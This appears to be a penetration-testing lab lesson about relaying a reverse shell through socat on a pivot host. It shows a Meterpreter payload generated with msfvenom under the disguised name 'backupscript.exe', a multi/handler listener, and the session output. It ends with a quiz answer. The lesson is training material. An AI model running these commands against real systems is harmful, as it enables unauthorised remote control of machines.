# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start `socat` on the Ubuntu server.

**Starting Socat Listener**

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

**Creating the Windows Payload**

```shell-session
AIceBear@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Keep in mind that we must transfer this payload to the Windows host. We can use some of the same techniques used in previous sections to do so.

**Starting MSF Console**

```shell-session
AIceBear@htb[/htb]$ sudo msfconsole

<SNIP>
```

**Configuring & Starting the multi/handler**

Socat Redirection with a Reverse Shell

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

We can test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.

**Establishing the Meterpreter Session**

```shell-session
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid

```

SSH tunneling is required with Socat. True or False?

False
